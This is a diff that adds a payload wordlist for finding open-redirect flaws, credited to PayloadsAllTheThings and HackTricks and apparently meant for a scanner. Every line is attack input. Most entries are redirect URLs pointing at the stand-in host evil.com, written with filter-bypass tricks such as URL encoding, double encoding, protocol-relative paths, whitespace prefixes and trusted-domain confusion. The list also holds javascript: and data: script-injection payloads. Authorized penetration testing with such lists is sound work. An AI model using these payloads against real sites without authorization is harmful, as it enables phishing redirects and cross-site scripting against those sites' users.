@@ -1,0 +1,48 @@
+# Open Redirect payloads
+# Source: PayloadsAllTheThings, HackTricks Open Redirect
+# Purpose: Detect open redirect by checking if the server redirects to an attacker-controlled URL
+
+# Direct external URLs
+https://evil.com
+https://evil.com/
+http://evil.com
+http://evil.com/
+//evil.com
+//evil.com/
+///evil.com
+
+# Protocol-relative with path confusion
+/\evil.com
+/\/evil.com
+//evil.com/%2f..
+//evil.com/%2F%2F
+
+# URL encoding bypass
+https:%2f%2fevil.com
+https:%2F%2Fevil.com
+%2f%2fevil.com
+%2F%2Fevil.com
+https:/%2fevil.com
+
+# JavaScript protocol
+javascript:alert(document.domain)
+javascript://evil.com/%0aalert(1)
+JAVASCRIPT:alert(1)
+
+# Data URI
+data:text/html,<script>alert(1)</script>
+
+# With subdomain confusion
+https://trusted.com.evil.com
+https://evil.com?trusted.com
+https://trusted.com@evil.com
+https://evil.com/trusted.com
+
+# Whitespace bypass
+ https://evil.com
+%09https://evil.com
+%0ahttps://evil.com
+%0dhttps://evil.com
+
+# Double encoding
+%68%74%74%70%73%3a%2f%2fevil.com
